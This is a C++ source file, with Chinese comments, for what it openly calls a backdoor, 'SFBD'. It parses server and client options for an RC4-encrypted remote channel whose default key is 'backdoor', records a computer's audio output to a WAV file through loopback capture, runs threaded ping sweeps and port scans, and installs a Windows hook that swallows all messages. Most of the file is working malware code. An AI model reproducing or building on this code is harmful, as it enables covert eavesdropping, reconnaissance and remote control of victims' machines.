#include "public.h"
#include "controller.hpp"

bool Config::enable_log = false;
string Config::key = "backdoor";
string Config::encry_mode = "rc4";
string Config::logfile = "SFBD.history";


int main(int argc, char* argv[]) {
    Config c;
    Args p(argc, argv, c);
    return 0;
}

Args::Args(int args_count, char* args_text[], Config& c) {
        this->match(c, args_count, args_text);
        if (c.enable_localarg) this->localarg(c, c.argfile);
}

//本地文件取参数
void Args::localarg(Config& c, string argfile) {
    fstream file(argfile, ios::in);
    static char** aa = new char* [50];
    int args_count = 0;

    for (int i = 0; i < 50; i++) {
        char* arg = new char[20];
        file >> arg;
        if (strcmp(arg, "") == 0) break;
        aa[i] = arg;
        args_count++;
    }
    this->match(c, args_count, aa);
    file.close();
}

void Args::match(Config& c, int args_count, char* args_text[]) {
    for (int i = 0; i < args_count; i++) {
        if (!strcmp(args_text[i], "-h")) {
            this->all_help();
        }
        else if (!strcmp(args_text[i], "--listen-port")) {
            c.listen_port = atoi(args_text[++i]);
        }
        else if (!strcmp(args_text[i], "--conn-port")) {
            c.conn_port = atoi(args_text[++i]);
        }
        else if (!strcmp(args_text[i], "--max-conn")) {
            c.max_conn = atoi(args_text[++i]);
        }
        else if (!strcmp(args_text[i], "--server")) {
            c.default_mode = "server";
        }
        else if (!strcmp(args_text[i], "--client")) {
            c.default_mode = "client";
        }
        else if (!strcmp(args_text[i], "--host")) {
            c.target = args_text[++i];
        }
        else if (!strcmp(args_text[i], "--log")) {
            c.enable_log = true;
            c.logfile = args_text[++i];
        }
        else if (!strcmp(args_text[i], "--bufsize")) {
            c.bufsize = atoi(args_text[++i]);
        }
        else if (!strcmp(args_text[i], "--passwd")) {
            Config::key = args_text[++i];
        }
        else if (!strcmp(args_text[i], "--enc-mode")) {
            c.encry_mode = args_text[++i];
        }
    }
    if (!c.default_mode.compare("server")) {
        server(c);
    }
    else if (!c.default_mode.compare("client")) {
        client(c);
    }
}

void Args::all_help() {
    string header = "usage: SFBD.exe [-h] [--server/--client] <--option>\n";
    string content = "detail:\n";
    content += "\t--server\t\t开启服务端模式\n";
    content += "\t--client\t\t开启客户端模式\n";
    content += "\t--listen-port\t\t修改服务端模式下的监听端口，默认为5180\n";
    content += "\t--max-conn\t\t修改服务端模式下会话的最大连接数，默认为10\n";
    content += "\t--host\t\t\t指定服务端IP用于连接，默认127.0.0.1\n";
    content += "\t--conn-port\t\t指定服务端的端口号用于连接，默认5180\n";
    content += "\t--enc-mode <rc4/rot>\t指定通信加密模式，默认为rc4\n";
    content += "\t--passwd\t\t指定通信加密时使用的密钥，默认为backdoor\n";
    content += "\t--bufsize\t\t指定接受消息的缓冲区大小（字节），默认为51800\n";
    content += "\t--log\t\t\t开启命令日志并指定日志文件名\n";
    cout << header << content << endl;
}


//设置基础变量,音频格式信息
WavWriter::WavWriter(WAVEFORMATEX* fm, string filename) {
    subchunk1Size = (unsigned int)sizeof(*fm) + fm->cbSize;
    fmt = new unsigned char[subchunk1Size];
    blockAlign = fm->nBlockAlign;
    memcpy(fmt, fm, subchunk1Size);
    this->filename = filename;
}

//释放资源
WavWriter::~WavWriter() { delete fmt; }

//初始化,创建wav文件并临时填充wav文件头(占位)
void WavWriter::init() {
    file.open(filename, ofstream::binary);
    for (int i = 0; i < 44; ++i) file.write((char*)"", 1);
}

//写入音频数据
void WavWriter::write(BYTE* data, int length) {
    file.write((char*)data, length * blockAlign);
    file.flush();
}

//填写wav文件头信息(需要填写主体内容才能计算文件头中的信息)并关闭文件
void WavWriter::close() {
    int len = file.tellp();
    subchunk2Size = len - (subchunk1Size + 28);
    chunkSize = 36 + subchunk2Size;
    file.seekp(0, file.beg);

    // WAVE HEADER
    file.write("RIFF", 4);
    file.write((char*)&chunkSize, 4);
    file.write("WAVE", 4);
    // FTM HEADER
    file.write("fmt ", 4);
    file.write((char*)&subchunk1Size, 4);
    file.write((char*)fmt, subchunk1Size);
    // DATA HEADER
    file.write("data", 4);
    file.write((char*)&subchunk2Size, 4);

    file.flush();
    file.close();
}

//构造函数,指定录音文件名,指定录制时长
AudioCapture::AudioCapture(string filename, int time) {
    this->cap_time = time;
    this->filename = filename;
}

//析构函数,释放堆区内存
AudioCapture::~AudioCapture() {
    delete wav_file;
    CoTaskMemFree(pwfx);
    if (pEnumerator != NULL) pEnumerator->Release();
    if (pDevice != NULL) pDevice->Release();
    if (pAudioClient != NULL) pAudioClient->Release();
    if (pCaptureClient != NULL) pCaptureClient->Release();
    CoUninitialize();
}

//初始化所有音频捕获基础步骤
string AudioCapture::init() {
    //单线程方式创建COM对象
    hr = CoInitialize(NULL);
    if (FAILED(hr)) return "创建COM对象失败\n";

    //创建组件,指定CLSID(类标识符),表示此对象不是聚合式对象的一部分,
    //指定组件类别,指定组件接口IID(接口标识符),用于返回此接口的指针
    hr = CoCreateInstance(CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL, IID_IMMDeviceEnumerator, (void**)&pEnumerator);
    if (FAILED(hr)) return "创建组件失败\n";

    //获取默认音频输出端点,表示渲染设备的数据流方向,指定端点设备的角色为多媒体,
    //指定返回音频端点设备对象接口的指针
    hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
    if (FAILED(hr)) return "获取默认音频设备失败\n";

    //创建具有指定接口的COM对象           
    hr = pDevice->Activate(IID_IAudioClient, CLSCTX_ALL, NULL, (void**)&pAudioClient);
    if (FAILED(hr)) return "激活COM对象失败\n";

    //获取音频流格式
    hr = pAudioClient->GetMixFormat(&pwfx);
    if (FAILED(hr)) return "获取音频流格式失败\n";

    wav_file = new WavWriter(pwfx, filename);
    hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_LOOPBACK, hnsRequestedDuration, 0, pwfx, NULL);
    if (FAILED(hr)) return "初始化音频客户端失败\n";

    //获取分配的缓冲区的大小
    hr = pAudioClient->GetBufferSize(&bufferFrameCount);
    if (FAILED(hr)) return "获取分配的缓冲区失败\n";

    //指定组件接口IID,指定音频客户端
    hr = pAudioClient->GetService(IID_IAudioCaptureClient, (void**)&pCaptureClient);
    if (FAILED(hr)) return "获取服务失败\n";

    //计算分配的缓冲区的实际持续时间
    // REFTIMES_PER_SEC = 10000000
    hnsActualDuration = (double)10000000 * bufferFrameCount / pwfx->nSamplesPerSec;
    return "初始化成功";
}

//持续捕获音频直到被调用才停止,独立线程
string AudioCapture::Recording() {
    string result = this->init() + "\n";
    wav_file->init();
    //开始录音
    hr = pAudioClient->Start();
    if (FAILED(hr)) return "启动录音失败";

    clock_t kopen = clock();
    //死循环,直到实际录制时长大于要求的录制时长
    while (true) {
        //睡眠以持续等待填满一半的缓冲区
        //REFTIMES_PER_MILLISEC = 10000
        Sleep(hnsActualDuration / 10000 / 2);
        //进入循环体流程
        hr = pCaptureClient->GetNextPacketSize(&packetLength);
        if (FAILED(hr)) "获取下一个数据包大小失败(循环体外)";

        while (packetLength != 0) {
            //获取共享缓冲区中的可用数据
            hr = pCaptureClient->GetBuffer(&pData, &numFramesAvailable, &flags, NULL, NULL);
            if (FAILED(hr)) return "获取共享缓冲区失败";

            wav_file->write(pData, numFramesAvailable);
            hr = pCaptureClient->ReleaseBuffer(numFramesAvailable);
            if (FAILED(hr)) return"释放缓冲区失败";

            //退出循环体流程
            hr = pCaptureClient->GetNextPacketSize(&packetLength);
            if (FAILED(hr)) return "获取下一个数据包大小失败(循环体内)";
        }
        //判断录制时长
        int ktime = (double(clock() - kopen) / CLOCKS_PER_SEC) * 1000;
        if (ktime > (cap_time * 1000))  break;
    }
    //停止并结束
    wav_file->close();
    hr = pAudioClient->Stop();
    if (FAILED(hr)) return "停止录音器失败";
    return result + "录制完成";
}

//PING扫描线程
DWORD WINAPI ICMPthread(void* args) {
    ThreadArgs* t = (ThreadArgs*)args;
    string output;
    Controller cont;

    while (true) {
        t->mtx.lock();
        //在停止前添加上次的输出数据
        t->result += output;
        output = "";
        //为空则停止
        if (t->IPlist.empty()) {
            t->mtx.unlock();
            break;
        }
        //取队列首个元素并出队
        string ip = t->IPlist.front();
        t->IPlist.pop();
        t->mtx.unlock();
        //进行ping
        string tmp = cont.Ping_Host(ip, t->TimeOut);
        if (!tmp.compare("alive"))
            output += "ip " + ip + " is alive!\n";
    }
    t->stop = true;
    return 0;
}

//端口扫描线程
DWORD WINAPI PORTthread(void* args) {
    ThreadArgs* t = (ThreadArgs*)args;
    string output;
    Controller cont;

    while (true) {
        t->mtx.lock();
        //在停止前添加上次的输出数据
        t->result += output;
        output = "";
        //为空则停止
        if (t->IPlist.empty()) {
            t->mtx.unlock();
            break;
        }
        //取队列首个元素并出队
        string ip = t->IPlist.front();
        t->IPlist.pop();
        t->mtx.unlock();
        //递增爆破端口，记录数据
        for (int i = t->StartPort; i < t->EndPort; i++) {
            string tmp = cont.Port_Scan(ip, i, t->TimeOut);
            if (!tmp.compare("open")) {
                output += "IP " + ip + " 端口 " + to_string(i) + " 开放\n";
            }
        }
    }
    t->stop = true;

    return 0;
}

LRESULT CALLBACK Hook_ALLMessage(int nCode, WPARAM wParam, LPARAM lParam)
{
    return true;
}
